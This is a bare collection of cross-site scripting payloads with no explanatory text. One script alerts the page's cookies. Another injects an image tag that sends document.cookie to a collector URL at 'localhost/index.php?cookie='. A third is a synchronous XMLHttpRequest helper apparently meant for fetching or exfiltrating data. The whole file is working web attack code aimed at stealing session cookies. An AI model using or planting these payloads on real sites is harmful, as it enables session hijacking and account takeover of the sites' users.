<script>
alert(document.cookie)
<\script>


<script>
document.write('<img src = "localhost/index.php?cookie= ' + escape(document.cookie) + '"/>');
<\script>


function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
